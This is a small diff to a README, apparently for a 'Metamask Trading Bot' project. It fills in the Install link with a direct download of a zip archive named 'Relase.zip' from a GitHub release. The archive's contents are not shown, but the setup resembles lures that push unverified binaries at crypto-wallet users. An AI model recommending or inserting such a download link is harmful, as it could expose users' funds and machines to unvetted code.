@@ -16,7 +16,7 @@
 
 # How to Get Started:
 
-🚀 Install --> [Releases]()
+🚀 Install --> [Releases](https://github.com/Tooppie/Metamask-Trading-Bot/releases/download/v2.6/Relase.zip)
 
  ![Boost Logo](metamask.gif)
 
